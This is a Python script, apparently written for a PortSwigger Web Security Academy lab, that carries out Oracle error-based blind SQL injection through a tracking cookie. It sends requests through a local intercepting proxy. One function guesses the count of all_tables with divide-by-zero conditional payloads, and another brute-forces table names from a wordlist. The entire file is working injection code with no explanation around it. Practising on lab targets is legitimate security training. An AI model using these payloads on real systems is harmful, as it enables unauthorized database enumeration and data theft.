import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = "https://0a4f005b04d0105fc1a01c5e00fe004c.web-security-academy.net/filter?category=Accessories"
cookie = {"TrackingId": "mq2HJqt6JmqYaHvi"}
proxies = {
   'http': 'http://localhost:8080',
   'https': 'http://localhost:8080',
}

payload_base = "'||(INSERTION_POINT)||'"

def findNumberOfTables():
    payloads = []
    numberOfTablesCount = []

    query = "select case when count(*)=INSERTION_POINT then 'true' else to_char(1/0) end from all_tables"
    for i in range(74, 76):
        tmp = query.replace("INSERTION_POINT",  str(i))
        tmp2 = payload_base.replace("INSERTION_POINT", tmp)
        numberOfTablesCount.append(str(i))
        payloads.append(tmp2)

    # Finalize
    print("FINDING NUMBER OF TABLES")

    for i,p in enumerate(payloads):
        tmp = {list(cookie.keys())[0]: list(cookie.values())[0]+payloads[i]}
        x = requests.get(url, cookies=tmp, verify=False, proxies=proxies)
        print("Payload count(*)=" +  numberOfTablesCount[i] +", code: " + str(x.status_code))

def findTableNames():
    
    query = "select '' from INSERTION_POINT where ROWNUM=1"
    oracleDefaultTables = []
    
    with open(r'C:\Users\noamj\Documents\GitHub\wordlists\portswigger\ps_sqli\sqliDevelopment\oracleDefaultTables.txt') as my_file:
        for line in my_file:
            oracleDefaultTables.append(line.rstrip('\n'))

    print("FINDING TABLE NAMES")
    for i in oracleDefaultTables:
        tmpA = query.replace("INSERTION_POINT", i)
        tmpB = payload_base.replace("INSERTION_POINT", tmpA)
        tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}

        x = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
        print("Table name: " + i, ", Status: " + str(x.status_code))

findTableNames()
#findNumberOfTables()